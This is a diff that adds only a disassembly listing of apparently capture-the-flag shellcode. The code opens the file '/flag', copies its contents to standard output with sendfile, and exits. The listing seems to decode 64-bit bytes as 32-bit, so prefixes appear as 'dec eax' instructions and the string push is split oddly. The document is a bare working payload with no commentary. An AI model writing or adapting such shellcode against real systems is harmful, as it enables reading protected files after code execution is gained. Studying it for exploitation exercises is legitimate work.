@@ -1,0 +1,26 @@
+   0:   48                      dec    eax
+   1:   31 c0                   xor    eax, eax
+   3:   48                      dec    eax
+   4:   bb 2f 66 6c 61          mov    ebx, 0x616c662f
+   9:   67 00 00                add    BYTE PTR [bx+si], al
+   c:   00 53 48                add    BYTE PTR [ebx+0x48], dl
+   f:   c7 c0 02 00 00 00       mov    eax, 0x2
+  15:   48                      dec    eax
+  16:   89 e7                   mov    edi, esp
+  18:   48                      dec    eax
+  19:   c7 c6 00 00 00 00       mov    esi, 0x0
+  1f:   0f 05                   syscall 
+  21:   48                      dec    eax
+  22:   c7 c7 01 00 00 00       mov    edi, 0x1
+  28:   48                      dec    eax
+  29:   89 c6                   mov    esi, eax
+  2b:   48                      dec    eax
+  2c:   c7 c2 00 00 00 00       mov    edx, 0x0
+  32:   49                      dec    ecx
+  33:   c7 c2 e8 03 00 00       mov    edx, 0x3e8
+  39:   48                      dec    eax
+  3a:   c7 c0 28 00 00 00       mov    eax, 0x28
+  40:   0f 05                   syscall 
+  42:   48                      dec    eax
+  43:   c7 c0 3c 00 00 00       mov    eax, 0x3c
+  49:   0f 05                   syscall
